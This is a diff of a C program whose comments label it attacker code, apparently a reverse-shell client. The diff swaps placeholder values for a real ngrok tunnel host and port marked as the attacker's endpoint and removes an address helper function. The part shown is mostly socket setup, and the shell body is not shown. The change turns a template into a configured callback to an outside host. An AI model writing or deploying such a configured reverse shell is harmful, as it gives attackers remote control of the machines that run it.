@@ -8,12 +8,9 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 
-/* return the sockaddr, inet or inet6 */
-void* get_addr_in(struct sockaddr *);
-
 int main(void) {
-    const char *RHOST = strdup("RHOST");  /* attacker's IP/domain */
-    const char *RPORT = strdup("RPORT");  /* attacker's port      */
+    const char *RHOST = strdup("2.tcp.eu.ngrok.io");  /* attacker's IP/domain */
+    const char *RPORT = strdup("13570");  /* attacker's port      */
 
     /* hints for getaddrinfo() */
     struct addrinfo hints;
@@ -82,11 +79,4 @@ int main(void) {
     close(sockfd);
 
     return EXIT_SUCCESS;
-}
-
-void* get_addr_in(struct sockaddr *sa) {
-    if (sa->sa_family == AF_INET) {
-        return &( ((struct sockaddr_in *)sa)->sin_addr );
-    }
-    return &( ((struct sockaddr_in6 *)sa)->sin6_addr );
 }
